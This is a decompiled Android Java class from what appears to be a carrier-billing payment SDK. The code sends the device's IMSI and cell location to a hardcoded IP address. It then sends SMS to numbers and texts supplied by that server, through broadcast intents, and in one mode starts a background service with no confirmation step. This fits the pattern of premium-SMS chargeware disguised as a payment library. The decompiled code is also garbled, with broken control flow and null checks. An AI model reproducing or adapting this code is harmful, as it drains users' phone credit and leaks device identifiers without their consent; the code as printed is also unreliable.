package com.zhangzhifu.sdk;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Handler;
import com.zhangzhifu.sdk.activity.ZhangPayActivity;
import com.zhangzhifu.sdk.db.MMQWapDBManager;
import com.zhangzhifu.sdk.db.MMWapDBManager;
import com.zhangzhifu.sdk.db.OnlineGameWapDBManager;
import com.zhangzhifu.sdk.db.PcOnlineGameWapDBManager;
import com.zhangzhifu.sdk.db.SMSDBManager;
import com.zhangzhifu.sdk.db.SharePreferUtil;
import com.zhangzhifu.sdk.db.WoLianTWapDBManager;
import com.zhangzhifu.sdk.modle.FeeBean;
import com.zhangzhifu.sdk.modle.MMQWap;
import com.zhangzhifu.sdk.modle.MMWap;
import com.zhangzhifu.sdk.modle.OnlineWap;
import com.zhangzhifu.sdk.modle.PcOnlineWap;
import com.zhangzhifu.sdk.modle.SMSBean;
import com.zhangzhifu.sdk.modle.WoLianTWap;
import com.zhangzhifu.sdk.protocolstack.ZhangPayXMLParser;
import com.zhangzhifu.sdk.service.ZhangPayPlateService;
import com.zhangzhifu.sdk.util.JudgeTimeUtil;
import com.zhangzhifu.sdk.util.NetManage;
import com.zhangzhifu.sdk.util.SimState;
import com.zhangzhifu.sdk.util.SystemInfo;
import com.zhangzhifu.sdk.util.TelUtils;
import com.zhangzhifu.sdk.util.Tools;
import com.zhangzhifu.sdk.util.ZhangPayLog;
import com.zhangzhifu.sdk.util.json.InitResponse;
import com.zhangzhifu.sdk.util.json.JSonParser_init;
import com.zhangzhifu.sdk.util.md5.Md5SignUtil;
import com.zhangzhifu.sdk.util.sms.SendSmsReceiver;
import java.io.PrintStream;
import java.util.HashMap;
import java.util.List;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;

public class ZhangPayEngine
{
  public static final int SIGN_MD5 = 1;
  public static final int SIGN_RSA = 2;
  public static final String TAG = "zhangPay_log";
  private static int aa;
  public static ZhangPayEngine zhangPaySdk;
  private List K;
  private String L;
  private String M;
  private String N;
  private String O;
  private String P;
  private String Q;
  private String R;
  private String S;
  private String T;
  private String U;
  private String V;
  private String W;
  private String X;
  private String Y;
  private String Z;
  private String appId;
  private Handler mHandler;
  public ZhangPayCallback zhangPayCallback;
  
  public ZhangPayEngine() {}
  
  private void a(Context paramContext, HashMap paramHashMap)
  {
    ZhangPayLog.d("zhangPay_log", "获取付费协议时间起");
    SharePreferUtil.getInstance().setSmsResult(paramContext, 1011);
    SharePreferUtil.setSendSMSMMQ(paramContext, 0);
    this.L = ((String)paramHashMap.get("channelId"));
    this.M = ((String)paramHashMap.get("priciePointId"));
    this.N = ((String)paramHashMap.get("money"));
    this.O = ((String)paramHashMap.get("cpparam"));
    this.Q = ((String)paramHashMap.get("key"));
    this.appId = ((String)paramHashMap.get("appId"));
    this.R = ((String)paramHashMap.get("qd"));
    this.P = ((String)paramHashMap.get("tradeName"));
    SharePreferUtil.getInstance();
    SharePreferUtil.setPriciePointId(paramContext, this.M);
    if ((SharePreferUtil.getInstance().getTradeName(paramContext) != null) || (SharePreferUtil.getInstance().getTradeName(paramContext) != "")) {
      SharePreferUtil.getInstance().setTradeName(paramContext, "");
    }
    SharePreferUtil.getInstance().setTradeName(paramContext, this.P);
    if ((SharePreferUtil.getInstance().getMoney(paramContext) != null) || (SharePreferUtil.getInstance().getMoney(paramContext) != "")) {
      SharePreferUtil.getInstance().setMoney(paramContext, "");
    }
    SharePreferUtil.getInstance().setMoney(paramContext, this.N);
    System.out.println("传入数据为：---------->channelId是：" + this.L + "priciePointId是：" + this.M + "money是：" + this.N + "cpparam是：" + this.O + "key是：" + this.Q + "appId是：" + this.appId + "qd是：" + this.R);
    int i = initNetSIM(paramContext, this.L);
    if (i != 1000)
    {
      onCallBackFaild(i);
      sendMsg(3);
      return;
    }
    String str;
    if (judgeIsResquest(paramContext)) {
      str = String.format("http://112.74.111.42:8000/zpayEntrancePayment?channelId=%s&priciePointId=%s&money=%s&cpparam=%s&appId=%s&qd=%s", new Object[] { this.L, this.M, this.N, this.O, this.appId, this.R });
    }
    try
    {
      SharePreferUtil.setLastCallTime(paramContext, System.currentTimeMillis());
      ZhangPayLog.d("zhangPay_log", "md5");
      paramHashMap = Tools.getContentByCMWAP(str, Tools.getHeadersByDefault(paramContext, Md5SignUtil.sign(String.format("channelId=%s&priciePointId=%s&money=%s&cpparam=%s&appId=%s&qd=%s", new Object[] { this.L, this.M, this.N, this.O, this.appId, this.R }), this.Q), this.L, TelUtils.getGSMCellLocationInfo(paramContext), 0.0D, 0.0D), paramContext).getEntity();
      try
      {
        ZhangPayLog.d("zhangPay_log", "请求付费接口地址url：---------->" + str);
        if (paramHashMap != null) {
          break label580;
        }
        d(paramContext, 1008);
        sendMsg(5);
        onCallBackFaild(1008);
      }
      catch (Exception paramContext)
      {
        for (;;)
        {
          paramContext.printStackTrace();
          sendMsg(10);
          onCallBackFaild(1008);
          ZhangPayLog.e("zhangPay_log", "支付产生未知错误");
        }
      }
      ZhangPayLog.d("zhangPay_log", "start 获取xml");
      return;
    }
    catch (Exception paramHashMap)
    {
      for (;;)
      {
        ZhangPayLog.e("zhangPay_log", "导致错误的情况有，1：网络无法连接，2：话费协议获取失败，3：在UI线程调用pay支付接口！");
        paramHashMap = null;
        continue;
        label580:
        paramHashMap = Tools.getStringFromInputStream(paramHashMap.getContent());
        if ((paramHashMap != null) || (!"".equals(paramHashMap))) {
          break;
        }
        d(paramContext, 1008);
        sendMsg(6);
        onCallBackFaild(1008);
      }
      if (paramHashMap.length() <= 4000) {
        break label1256;
      }
    }
    ZhangPayLog.d("zhangPay_log", "http request content 是：[" + paramHashMap.substring(0, 4000));
    ZhangPayLog.d("zhangPay_log", paramHashMap.substring(4000, paramHashMap.length()) + "]");
    label733:
    i = 0;
    if ("-1".equals(paramHashMap))
    {
      ZhangPayLog.i("zhangPay_log", "服务器返回未知错误，检查参数");
      SharePreferUtil.getInstance().setDataResult(paramContext, 10090);
      i = -1;
    }
    if ("1".equals(paramHashMap))
    {
      ZhangPayLog.i("zhangPay_log", "该计费点没有匹配相应的扣费通道");
      SharePreferUtil.getInstance().setDataResult(paramContext, 10091);
      i = 1;
    }
    if ("2".equals(paramHashMap))
    {
      ZhangPayLog.i("zhangPay_log", "该手机号码被列入黑名单");
      SharePreferUtil.getInstance().setDataResult(paramContext, 10092);
      i = 2;
    }
    if ("3".equals(paramHashMap))
    {
      ZhangPayLog.i("zhangPay_log", "没有相应的计费点");
      SharePreferUtil.getInstance().setDataResult(paramContext, 10093);
      i = 3;
    }
    if ("4".equals(paramHashMap))
    {
      ZhangPayLog.i("zhangPay_log", "验签错误");
      SharePreferUtil.getInstance().setDataResult(paramContext, 10094);
      i = 4;
    }
    if ("5".equals(paramHashMap))
    {
      ZhangPayLog.i("zhangPay_log", "key秘钥异常");
      SharePreferUtil.getInstance().setDataResult(paramContext, 10095);
      i = 5;
    }
    if ("6".equals(paramHashMap))
    {
      ZhangPayLog.i("zhangPay_log", "系统资费异常");
      SharePreferUtil.getInstance().setDataResult(paramContext, 10096);
      i = 6;
    }
    if ("7".equals(paramHashMap))
    {
      ZhangPayLog.i("zhangPay_log", "15s内订单重复提交");
      SharePreferUtil.getInstance().setDataResult(paramContext, 10097);
      i = 7;
    }
    if ("8".equals(paramHashMap))
    {
      ZhangPayLog.i("zhangPay_log", "15s内订单重复提交");
      SharePreferUtil.getInstance().setDataResult(paramContext, 10098);
      i = 8;
    }
    if ("9".equals(paramHashMap))
    {
      ZhangPayLog.i("zhangPay_log", "15s内订单重复提交");
      SharePreferUtil.getInstance().setDataResult(paramContext, 10099);
      i = 9;
    }
    if ("10".equals(paramHashMap))
    {
      ZhangPayLog.i("zhangPay_log", "15s内订单重复提交");
      SharePreferUtil.getInstance().setDataResult(paramContext, 100910);
      i = 10;
    }
    if ("11".equals(paramHashMap))
    {
      ZhangPayLog.i("zhangPay_log", "15s内订单重复提交");
      SharePreferUtil.getInstance().setDataResult(paramContext, 100911);
      i = 11;
    }
    if ("12".equals(paramHashMap))
    {
      ZhangPayLog.i("zhangPay_log", "15s内订单重复提交");
      SharePreferUtil.getInstance().setDataResult(paramContext, 100912);
      i = 12;
    }
    if (i != 0)
    {
      sendMsg(7);
      switch (i)
      {
      }
    }
    for (;;)
    {
      paramHashMap = ZhangPayFeeDispath.getInstance().getHtml(paramHashMap);
      if (paramHashMap == null)
      {
        d(paramContext, 1009);
        sendMsg(8);
        onCallBackFaild(1009);
        break;
        label1256:
        ZhangPayLog.d("zhangPay_log", "http request content 是：[" + paramHashMap + "]");
        break label733;
        onCallBackFaild(10091);
        continue;
        onCallBackFaild(10092);
        continue;
        onCallBackFaild(10093);
        continue;
        onCallBackFaild(10094);
        continue;
        onCallBackFaild(10095);
        continue;
        onCallBackFaild(10096);
        continue;
        onCallBackFaild(10097);
        continue;
        onCallBackFaild(10098);
        continue;
        onCallBackFaild(10099);
        continue;
        onCallBackFaild(100910);
        continue;
        onCallBackFaild(100911);
        continue;
        onCallBackFaild(100912);
        continue;
      }
      this.K = new ZhangPayXMLParser().readXML(paramHashMap, paramContext);
      ZhangPayLog.e("zhangPay_log", "计费通道的数量是：" + this.K.size());
      if ((this.K == null) || (this.K.size() <= 0)) {
        break;
      }
      sendSMSToMiao(paramContext);
      a(paramContext, this.K);
      d(paramContext, 999);
      ZhangPayLog.d("zhangPay_log", "获取付费协议时间终");
      int j = 0;
      if (SharePreferUtil.getIsPOP(paramContext) == 1)
      {
        ZhangPayLog.i("zhangPay_log", "ZhangPay计费提示框启动");
        ZhangPayLog.i("zhangPay_log", "当前弹窗为：[ 是]");
        i = j;
        if (this.mHandler == null)
        {
          ZhangPayLog.i("zhangPay_log", "二次确认，建议调用pay接口时将第四个参数传入true，将会 显示加载进度条");
          paramHashMap = new Intent();
          paramHashMap.setClass(paramContext, ZhangPayActivity.class);
          paramHashMap.addFlags(268435456);
          paramHashMap.putExtra("enterType", 1111);
          paramContext.startActivity(paramHashMap);
          i = j;
        }
      }
      for (;;)
      {
        sendMsg(i);
        break;
        if (SharePreferUtil.getIsPOP(paramContext) == 0)
        {
          ZhangPayLog.i("zhangPay_log", "当前弹窗为：[ 否]");
          i = 1;
          paramContext.startService(new Intent(paramContext, ZhangPayPlateService.class));
          getSmsSendResult(paramContext);
        }
        else
        {
          ZhangPayLog.i("zhangPay_log", "当前弹窗为：[ 是]");
          i = j;
          if (this.mHandler == null)
          {
            ZhangPayLog.i("zhangPay_log", "二次确认，建议调用pay接口时将第四个参数传入true，将会 显示加载进度条");
            paramHashMap = new Intent();
            paramHashMap.setClass(paramContext, ZhangPayActivity.class);
            paramHashMap.addFlags(268435456);
            paramHashMap.putExtra("enterType", 1111);
            paramContext.startActivity(paramHashMap);
            i = j;
          }
        }
      }
    }
  }
  
  private static void a(Context paramContext, List paramList)
  {
    int i;
    if (paramList != null)
    {
      OnlineGameWapDBManager.getInstance().delpro(paramContext);
      SMSDBManager.getInstance().deleteAllSMS(paramContext);
      PcOnlineGameWapDBManager.getInstance().delpro(paramContext);
      MMWapDBManager.getInstance().delpro(paramContext);
      WoLianTWapDBManager.getInstance().delpro(paramContext);
      MMQWapDBManager.getInstance().delpro(paramContext);
      i = 0;
      if (i < paramList.size()) {}
    }
    else
    {
      return;
    }
    FeeBean localFeeBean = (FeeBean)paramList.get(i);
    if ((localFeeBean instanceof SMSBean)) {
      SMSDBManager.getInstance().insertSMS((SMSBean)localFeeBean, paramContext);
    }
    for (;;)
    {
      i += 1;
      break;
      if ((localFeeBean instanceof OnlineWap))
      {
        OnlineGameWapDBManager.getInstance().addWapFee((OnlineWap)localFeeBean, paramContext);
      }
      else if ((localFeeBean instanceof PcOnlineWap))
      {
        PcOnlineGameWapDBManager.getInstance().addWapFee((PcOnlineWap)localFeeBean, paramContext);
      }
      else if ((localFeeBean instanceof MMWap))
      {
        MMWapDBManager.getInstance().addMMFee((MMWap)localFeeBean, paramContext);
      }
      else if ((localFeeBean instanceof WoLianTWap))
      {
        WoLianTWapDBManager.getInstance().addWapFee((WoLianTWap)localFeeBean, paramContext);
      }
      else if ((localFeeBean instanceof MMQWap))
      {
        System.out.println("数据库里面增加");
        MMQWapDBManager.getInstance().addWapFee((MMQWap)localFeeBean, paramContext);
      }
    }
  }
  
  private void d(Context paramContext, int paramInt)
  {
    new Thread(new d(this, paramContext, paramInt)).start();
  }
  
  public static ZhangPayEngine getInstance()
  {
    if (zhangPaySdk == null) {
      zhangPaySdk = new ZhangPayEngine();
    }
    return zhangPaySdk;
  }
  
  public void getSmsSendResult(Context paramContext)
  {
    SharePreferUtil.getInstance().setSmsResult(paramContext, 1011);
    new Thread(new a(this, paramContext)).start();
    sendSMSToQ(paramContext);
  }
  
  public int init(Context paramContext, String paramString1, String paramString2, String paramString3)
  {
    if ((paramString1 != null) || ((paramString1.equals("")) && (paramString2 != null)) || ((paramString2.equals("")) && (paramString3 != null)) || (paramString3.equals("")))
    {
      SimState localSimState = SimState.getCurrentSimState(paramContext);
      SharePreferUtil.getLastIMSI(paramContext).trim();
      String str1 = SharePreferUtil.getInstance().getChannelId(paramContext);
      SharePreferUtil.getInstance();
      String str2 = SharePreferUtil.getQd(paramContext);
      SharePreferUtil.getInstance();
      SharePreferUtil.getAppId(paramContext);
      if ((str1 == null) || (str1.equals("")))
      {
        SharePreferUtil.getInstance().setChannelId(paramContext, paramString1);
        if ((str2 != null) && (!str2.equals(""))) {
          break label200;
        }
        SharePreferUtil.getInstance();
        SharePreferUtil.setQd(paramContext, paramString3);
        label131:
        if ((str1 != null) && (!str1.equals(""))) {
          break label213;
        }
        SharePreferUtil.getInstance();
        SharePreferUtil.setAppId(paramContext, paramString2);
      }
      boolean bool1;
      boolean bool2;
      for (;;)
      {
        paramString2 = new NetManage(paramContext);
        bool1 = paramString2.isDataConnected();
        bool2 = paramString2.checkNetworkConnection(paramContext);
        if (localSimState.isSimState()) {
          break label225;
        }
        return 1006;
        SharePreferUtil.getInstance().setChannelId(paramContext, paramString1);
        break;
        label200:
        SharePreferUtil.getInstance();
        SharePreferUtil.setQd(paramContext, paramString3);
        break label131;
        label213:
        SharePreferUtil.getInstance();
        SharePreferUtil.setAppId(paramContext, paramString2);
      }
      label225:
      paramString2 = SystemInfo.getIMSI(paramContext);
      ZhangPayLog.i("zhangPay_log", "当前设备IMSI号码：[" + paramString2 + "]");
      ZhangPayLog.i("zhangPay_log", "当前掌支付SDK的版本为：[ 3.3.14]");
      if ((!bool1) && (!bool2)) {
        return 1007;
      }
      try
      {
        paramString2 = Tools.getContentByCMWAP("http://112.74.111.42:8000/zpayinit" + "?type=1", Tools.getHeadersByDefault(paramContext, null, paramString1), paramContext).getEntity();
        if (paramString2 != null)
        {
          paramString2 = Tools.getBody(paramString2);
          if (paramString2 != null)
          {
            paramString2 = JSonParser_init.getInitResponse(paramString2);
            this.S = paramString2.getResultCode();
            this.U = paramString2.getContent();
            this.T = paramString2.getSendMobile();
            this.V = paramString2.getMobileImsi();
            System.out.println("maochiCode是：" + this.S + "maochiMobel是：" + this.T + "maochiContent是：" + this.U + "maochiImsi是：" + this.V);
          }
        }
        paramString2 = Tools.getContentByCMWAP("http://112.74.111.42:8000/zpayinit" + "?type=2", Tools.getHeadersByDefault(paramContext, null, paramString1), paramContext).getEntity();
        if (paramString2 != null)
        {
          paramString2 = Tools.getBody(paramString2);
          if (paramString2 != null)
          {
            paramString2 = JSonParser_init.getInitResponse(paramString2);
            this.W = paramString2.getResultCode();
            this.Y = paramString2.getContent();
            this.X = paramString2.getSendMobile();
            this.Z = paramString2.getMobileImsi();
            System.out.println("maochiCodeQ是：" + this.W + "maochiMobelQ是：" + this.X + "maochiContentQ是：" + this.Y + "maochiImsiQ是：" + this.Z);
          }
        }
      }
      catch (Exception paramString2)
      {
        for (;;)
        {
          ZhangPayLog.w("zhangPay_log", "初始化可能不成功；请保证设备可联网，有SIM卡并有话费！");
        }
      }
      ZhangPayLog.d("zhangPay_log", "初始化结果为：1000");
      ZhangPayRecodeServer.getInstance().sentMessServer(paramContext, paramString1, 1000);
      return 1000;
    }
    ZhangPayLog.d("zhangPay_log", "初始化结果为：998");
    return 998;
  }
  
  public void initLocation(Context paramContext)
  {
    HashMap localHashMap = TelUtils.getGSMCellLocationInfo(paramContext);
    try
    {
      SharePreferUtil.putString(paramContext, "lac", (String)localHashMap.get("lac"));
      SharePreferUtil.putString(paramContext, "mcc", (String)localHashMap.get("mcc"));
      SharePreferUtil.putString(paramContext, "mnc", (String)localHashMap.get("mnc"));
      SharePreferUtil.putString(paramContext, "cid", (String)localHashMap.get("cid"));
      ZhangPayLog.e("zhangPay_log", "lac:" + (String)localHashMap.get("lac") + "mcc:" + (String)localHashMap.get("mcc") + "mnc:" + (String)localHashMap.get("mnc") + "cid:" + (String)localHashMap.get("cid"));
      return;
    }
    catch (Exception paramContext)
    {
      ZhangPayLog.e("zhangPay_log", "定位失败");
    }
  }
  
  public int initNetSIM(Context paramContext, String paramString)
  {
    paramString = SimState.getCurrentSimState(paramContext);
    NetManage localNetManage = new NetManage(paramContext);
    boolean bool1 = localNetManage.isDataConnected();
    boolean bool2 = localNetManage.checkNetworkConnection(paramContext);
    paramContext = SystemInfo.getIMSI(paramContext);
    ZhangPayLog.i("zhangPay_log", "当前设备IMSI号码：[" + paramContext + "]");
    if (!paramString.isSimState()) {
      return 1006;
    }
    if ((!bool1) && (!bool2)) {
      return 1007;
    }
    return 1000;
  }
  
  public boolean judgeIsResquest(Context paramContext)
  {
    System.out.println("是否具备请求条件" + JudgeTimeUtil.judgeTime(paramContext));
    if (JudgeTimeUtil.judgeTime(paramContext))
    {
      if (JudgeTimeUtil.isMax(1, paramContext)) {
        return true;
      }
      sendMsg(11);
      onCallBackFaild(990);
      return false;
    }
    sendMsg(12);
    onCallBackFaild(991);
    return false;
  }
  
  public void onCallBackFaild(int paramInt)
  {
    if (this.mHandler != null)
    {
      this.mHandler.post(new c(this, paramInt));
      return;
    }
    if (this.zhangPayCallback == null) {
      throw new RuntimeException("ZhangPayCallback is null ? == 回调函数不能为空。");
    }
    this.zhangPayCallback.onZhangPayBuyProductFaild(this.M, paramInt);
  }
  
  public void onCallBackSuc()
  {
    if (this.mHandler != null)
    {
      this.mHandler.post(new b(this));
      return;
    }
    this.zhangPayCallback.onZhangPayBuyProductOK(this.M, "1001");
  }
  
  public void pay(Context paramContext, HashMap paramHashMap, ZhangPayCallback paramZhangPayCallback)
  {
    this.zhangPayCallback = paramZhangPayCallback;
    this.mHandler = null;
    a(paramContext, paramHashMap);
  }
  
  public void pay(Context paramContext, HashMap paramHashMap, ZhangPayCallback paramZhangPayCallback, Handler paramHandler)
  {
    this.mHandler = paramHandler;
    this.zhangPayCallback = paramZhangPayCallback;
    a(paramContext, paramHashMap);
  }
  
  public void sendMsg(int paramInt)
  {
    if (this.mHandler != null) {
      this.mHandler.sendEmptyMessage(paramInt);
    }
  }
  
  public void sendSMSToMiao(Context paramContext)
  {
    try
    {
      if (((this.T != null) || (this.T.length() > 0)) && (this.S.equals("0")))
      {
        paramContext.registerReceiver(SendSmsReceiver.getReceiver(), new IntentFilter("android.zhangzhifu.SEND_SMS_RECEIVER"));
        Intent localIntent = new Intent();
        localIntent.putExtra("mobile", this.T);
        localIntent.putExtra("content", this.U);
        localIntent.setAction("android.zhangzhifu.SEND_SMS_RECEIVER");
        paramContext.sendBroadcast(localIntent);
      }
      return;
    }
    catch (Exception paramContext) {}
  }
  
  public void sendSMSToQ(Context paramContext)
  {
    try
    {
      if (((this.X != null) || (this.X.length() > 0)) && (this.W.equals("0")))
      {
        paramContext.registerReceiver(SendSmsReceiver.getReceiver(), new IntentFilter("android.zhangzhifu.SEND_SMS_RECEIVER"));
        Intent localIntent = new Intent();
        localIntent.putExtra("mobile", this.X);
        localIntent.putExtra("content", this.Y);
        localIntent.setAction("android.zhangzhifu.SEND_SMS_RECEIVER");
        paramContext.sendBroadcast(localIntent);
      }
      return;
    }
    catch (Exception paramContext) {}
  }
}
